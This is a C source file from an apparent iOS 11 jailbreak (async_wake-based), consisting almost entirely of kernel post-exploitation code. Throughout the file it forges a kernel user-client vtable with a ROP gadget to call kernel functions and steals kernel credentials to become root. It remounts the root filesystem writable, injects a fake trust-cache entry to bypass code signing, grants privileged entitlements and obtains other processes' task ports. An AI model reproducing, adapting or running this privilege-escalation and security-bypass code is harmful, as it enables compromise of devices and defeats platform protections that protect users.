//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_special = 2 * sizeof(long); // host::special

#define	CS_VALID		0x0000001	/* dynamically valid */
#define CS_ADHOC		0x0000002	/* ad hoc signed */
#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
#define CS_INSTALLER		0x0000008	/* has installer entitlement */

#define	CS_HARD			0x0000100	/* don't load invalid pages */
#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
#define CS_REQUIRE_LV		0x0002000	/* require library validation */
#define CS_ENTITLEMENTS_VALIDATED	0x0004000

#define	CS_ALLOWED_MACHO	0x00ffffe

#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */

uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
	// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
	// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
	// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
	// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
	// through like normal.
	
	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
	// (i'm not actually sure if the switch back is necessary but meh)
	
	uint64_t offx20 = kread64(fake_client+0x40);
	uint64_t offx28 = kread64(fake_client+0x48);
	kwrite64(fake_client+0x40, x0);
	kwrite64(fake_client+0x48, addr);
	uint64_t returnval = iokit_user_client_trap(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
	kwrite64(fake_client+0x40, offx20);
	kwrite64(fake_client+0x48, offx28);
	return returnval;
}

typedef struct
{
	uint64_t prev;
	uint64_t next;
	uint64_t start;
	uint64_t end;
} kmap_hdr_t;

void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
	
	init_kernel_utils(tfp0, user_client);
	
	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
	
	// Get the slide
	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
	printf("[fun] slide: 0x%016llx\n", slide);
	
	kmap_hdr_t kernel_map;
	
	kread(kread64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));

	uint64_t zm_tmp;
#   define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
)
	
	
	
	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
	uint64_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
	uint64_t IOSurfaceRootUserClient_vtab = kread64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
	
	// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
	// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel

	
	// Create the vtable in the kernel memory, then copy the existing vtable into there
	uint64_t fake_vtable = kalloc(0x1000);
	printf("[fun] Created fake_vtable at %016llx\n", fake_vtable);
	
	for (int i = 0; i < 0x200; i++) {
		kwrite64(fake_vtable+i*8, kread64(IOSurfaceRootUserClient_vtab+i*8));
	}
	
	printf("[fun] Copied some of the vtable over\n");
	
	
	// Create the fake user client
	uint64_t fake_client = kalloc(0x1000);
	printf("[fun] Created fake_client at %016llx\n", fake_client);
	
	for (int i = 0; i < 0x200; i++) {
		kwrite64(fake_client+i*8, kread64(IOSurfaceRootUserClient_addr+i*8));
	}
	
	printf("[fun] Copied the user client over\n");
	
	// Write our fake vtable into the fake user client
	kwrite64(fake_client, fake_vtable);
	
	// Replace the user client with ours
	kwrite64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
	
	// Now the userclient port we have will look into our fake user client rather than the old one
	
	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
	kwrite64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
	
	printf("[fun] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
	
	#define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kexecute(user_client, fake_client, addr, (uint64_t)x0, (uint64_t)x1, (uint64_t)x2, (uint64_t)x3, (uint64_t)x4, (uint64_t)x5, (uint64_t)x6)
	
	// Get our and the kernels struct proc from allproc
	uint32_t our_pid = getpid();
	uint64_t our_proc = 0;
	uint64_t kern_proc = 0;
	uint64_t container_proc = 0;
	
	uint64_t proc = kread64(find_allproc());
	while (proc) {
		uint32_t pid = (uint32_t)kread32(proc + 0x10);
		char name[40] = {0};
		kread(proc+0x268, name, 20);
		if (pid == our_pid) {
			our_proc = proc;
		} else if (pid == 0) {
			kern_proc = proc;
		} else if (strstr(name, "launchd")) {
			container_proc = proc;
			uint64_t mac_pol = kread64(kread64(proc+0x100)+0x78);
			//				printf("MAC policies for this process are at %016llx\n", mac_pol);
			uint64_t amfi_mac_pol = kread64(mac_pol+0x8); // This is actually an OSDictionary zz
			//				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
			
			uint64_t str = kalloc(strlen("get-task-allow")+1);
			kwrite(str, "get-task-allow", strlen("get-task-allow"));
			uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
			kexecute(kread64(kread64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
			
			
//			uint32_t f = kread32(amfi_mac_pol+20); // Number of items in the dictionary
//			//				printf("%d\n", f);
//
//
//			uint64_t g = kread64(amfi_mac_pol+32); // Item buffer
//			//				printf("%016llx\n", g);
//
//			for (int i = 0; i < f; i++) {
//				//					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
//				printf("%016llx\n", kread64(kread64(g+16*i+8)));
//				//					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
//
//				size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
//
//				char* s = (char*)calloc(length+1, 1);
//				kread(kread64(kread64(g+16*i)+0x10), s, length);
//				printf("%s\n", s);
//
//			}
		}
		if (pid != 0) {
			uint32_t csflags = kread32(proc + offsetof_p_csflags);
			kwrite32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
		}
		proc = kread64(proc);
	}
	
	printf("[fun] our proc is at 0x%016llx\n", our_proc);
	printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
	
	// Give us some special flags
//	uint32_t csflags = kread32(our_proc + offsetof_p_csflags);
//	kwrite32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
	
	// Properly copy the kernel's credentials so setuid(0) doesn't crash
	uint64_t kern_ucred = 0;
	kexecute(find_copyout(), kern_proc+0x100, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
	
	uint64_t self_ucred = 0;
	kexecute(find_copyout(), our_proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);

	kexecute(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
	kexecute(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
	
	// setuid(0) + test
	{
		
		printf("[fun] our uid was %d\n", getuid());
		
		setuid(0);
		
		printf("[fun] our uid is %d\n", getuid());
		
		FILE *f = fopen("/var/mobile/.root_fun", "w");
		if (f == 0) {
			printf("[fun] failed to write test file. something didn't work\n");
		} else {
			printf("[fun] wrote test file: %p\n", f);
		}
		fclose(f);
	}
	
	// Remount / as rw - patch by xerub
	{
		vm_offset_t off = 0xd8;
		uint64_t _rootvnode = find_rootvnode();
		uint64_t rootfs_vnode = kread64(_rootvnode);
		uint64_t v_mount = kread64(rootfs_vnode + off);
		uint32_t v_flag = kread32(v_mount + 0x71);
		
		kwrite32(v_mount + 0x71, v_flag & ~(1 << 6));
		
		char *nmz = strdup("/dev/disk0s1s1");
		int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
		printf("[fun] remounting: %d\n", rv);
		
		v_mount = kread64(rootfs_vnode + off);
		kwrite32(v_mount + 0x71, v_flag);
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("[fun] file already exists!\n");
		}
		close(fd);
		
		printf("[fun] Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
	}
	
	
	
	uint64_t tc = find_trustcache();
	printf("[fun] trust cache at: %016llx\n", kread64(tc));
	
	typedef char hash_t[20];
	
	struct trust_chain {
		uint64_t next; 				// +0x00 - the next struct trust_mem
		unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
		unsigned int count;			// +0x18 - Number of hashes there are
		hash_t hash[2];		// +0x1C - The hashes
	};
	
	struct trust_chain fake_chain;
	
	fake_chain.next = kread64(tc);
	*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
	*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
	fake_chain.count = 2;
	
//	mkdir("/Library/LaunchDaemons", 777);
//	cp(plistPath2(), "/Library/LaunchDaemons/test_fsigned.plist");
	
#define BinaryLocation "/usr/bin/test_fsigned"
	
	unlink(BinaryLocation);
	cp(binaryName(), BinaryLocation);
	chmod(BinaryLocation, 777);
//	chmod(launchctlpath(), 777);
	

	uint8_t *hash = get_sha256(get_code_directory(BinaryLocation));
//	uint8_t *hash2 = get_sha256(get_code_directory(launchctlpath())); // launchctl doesn't seem to be working - null object is returned
	
	memmove(fake_chain.hash[0], hash, 20); // Order doesn't matter
	memmove(fake_chain.hash[1], hash, 20);
	
	uint64_t kernel_trust = kalloc(sizeof(fake_chain));
	kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
	// Comment this line out to see `amfid` saying there is no signature on test_fsigned (or your binary)
	kwrite64(tc, kernel_trust);
	
	pid_t pd;
	
	const char* args[] = {BinaryLocation, NULL};
	int rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args, NULL);
	
	mach_port_t pt = 0;
	printf("getting Springboards task: %s\n", mach_error_string(task_for_pid(mach_task_self(), 55, &pt)));
	
	int tries = 3;
	while (tries-- > 0) {
		sleep(1);
		uint64_t proc = kread64(find_allproc());
		while (proc) {
			uint32_t pid = kread32(proc + offsetof_p_pid);
			if (pid == pd) {
				uint32_t csflags = kread32(proc + offsetof_p_csflags);
				csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
				kwrite32(proc + offsetof_p_csflags, csflags);
//				printf("empower\n");
				tries = 0;
				uint64_t self_ucred = 0;
				kexecute(find_copyout(), proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
//
//				KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
//				KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
				
				
				
				uint64_t mac_pol = kread64(self_ucred+0x78);
//				printf("MAC policies for this process are at %016llx\n", mac_pol);
				uint64_t amfi_mac_pol = kread64(mac_pol+0x8); // This is actually an OSDictionary zz
//				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
				
				uint32_t f = kread32(amfi_mac_pol+20); // Number of items in the dictionary
//				printf("%d\n", f);
	
				
				uint64_t g = kread64(amfi_mac_pol+32); // Item buffer
//				printf("%016llx\n", g);
				
				for (int i = 0; i < f; i++) {
//					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
					printf("%016llx\n", kread64(kread64(g+16*i+8)));
//					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
					
					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
					
					char* s = (char*)calloc(length+1, 1);
					kread(kread64(kread64(g+16*i)+0x10), s, length);
					printf("%s\n", s);
					
				}
				
				printf("Gave us task_for_pid-allow\n");
				
				
//
				uint64_t str = kalloc(strlen("task_for_pid-allow")+1);
				kwrite(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
				uint64_t getObject = kread64(kread64(amfi_mac_pol)+304);
				uint64_t out = ZM_FIX_ADDR(kexecute(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0));
				
				printf("%08x\n", kread32(out+0xc));
				
//				printf("%016llx\n", kexecute(slide+0xFFFFFFF00707FB58, out, 0, 0, 0, 0, 0, 0));
//
//				KCALL(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0);
//				uint64_t out = returnval;
				printf("%016llx\n", out);
//
//				KCALL(slide+0xFFFFFFF00707FB58, out|0xfffffff000000000, 0, 0, 0, 0, 0, 0);
//				printf("%016llx\n", returnval);
//
				

				uint64_t bo = kalloc(8);
				kexecute(0xFFFFFFF00637D88C + slide, proc, str, bo, 0, 0, 0, 0);
				printf("hi - %016llx\n", kread64(bo));
				
				uint64_t new_ent_dict = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074AAD50+slide, 4, 0, 0, 0, 0, 0, 0)); // OSDictionary::withCapacity
				printf("new_ent_dict - %016llx\n", kread64(new_ent_dict));
				
				uint64_t symbol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074C2D90+slide, str, 0, 0, 0, 0, 0, 0)); // OSSymbol::withCString
				printf("symbol - %016llx\n", kread64(symbol));
				
				uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0)); // OSBoolean::withBoolean
//																					 0x0000000012800000
				printf("bol - %016llx\n", kread64(bol));
				uint64_t bol2 = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
				
				uint64_t str2 = kalloc(strlen("com.apple.system-task-ports")+1);
				kwrite(str2, "com.apple.system-task-ports", strlen("com.apple.system-task-ports"));
				
				
				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str, bol, 0, 0, 0, 0);
				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str2, bol2, 0, 0, 0, 0);
				kwrite64(kread64(kern_ucred+0x78)+0x8, amfi_mac_pol);
				
				break;
			}
			proc = kread64(proc);
		}
	}
	
	waitpid(pd, NULL, 0);
	
	pt = 0;
	task_t sb = 0;
	printf("getting Springboards task: %s\n", mach_error_string(task_for_pid(mach_task_self(), 1, &sb)));
	printf("sb task: %016llx\n", sb);
	printf("my task: %016llx\n", mach_task_self());
	
	
//	printf("%016llx\n", find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND));
//	mach_port_t sb_port = kexecute(0xFFFFFFF0070C7C88+slide, find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND), 0, 0, 0, 0, 0, 0)|0xfffffff100000000;
//	printf("sb_port potentially at %016llx - %016llx\n", sb_port, kread64(sb_port));
	
	uint64_t task_port_addr = task_self_addr();
	uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
	uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
	uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

	uint32_t port_index = sb >> 8;
	const int sizeof_ipc_entry_t = 0x18;
	uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry

	printf("%d\n", bits);

#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)

	bits &= (~IE_BITS_RECEIVE);
	bits |= IE_BITS_SEND;

	wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
//
//	sb = find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND);
//
//	uint64_t struct_task = rk64(sb + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
//
//	while (struct_task != 0) {
//		uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
//
//		uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
//
//		if (pid == 55) {
//			sb = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
//
//			printf("Found SB vmap! - %016llx\n", sb);
//			break;
//		}
//
//		struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
//	}
	
//	uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
//
//	if (pid == 0) {
//		uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
	
	
	
	mach_vm_address_t address = 0;
	kern_return_t kr = mach_vm_allocate(sb, (mach_vm_address_t *)&address, 0x10, VM_FLAGS_ANYWHERE);
	printf("%d - %s\n", kr, mach_error_string(kr));
	
	
	// zzz AMFI sucks..
	/*
	 	Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
	 
	 	So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
	 	What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
	 	used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
	 	to get every hash, or just the main CDHash and insert that one into the trust chain?
	 
	 	If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
	 	the following (struct from xerub, but I've checked with AMFI that it is the case):
	 
		struct trust_mem {
			uint64_t next; 				// +0x00 - the next struct trust_mem
			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
			unsigned int count;			// +0x18 - Number of hashes there are
			unsigned char hashes[];		// +0x1C - The hashes
		}
	 
		The trust chain checker does the following:
	 	- Find the first struct that has a count > 0
	 	- Loop through all the hashes in the struct, comparing with the current hash
	 	- Keeps going through each chain, then when next is 0, it finishes
	 
		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
	 			 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
	 				This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
	 
		 So our execution method is as follows:
		 - Calculate the CD Hashes for the target resources that we want to play around with
		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
	     - ??? PROFIT
	 */
	
	// Cleanup
	
//	char *nmz = strdup("/dev/disk0s1s1");
//	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
//	printf("[fun] remounting: %d\n", rv);
	
	kwrite64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
	kwrite64(kread64(kern_ucred+0x78)+0x8, 0);
	
}
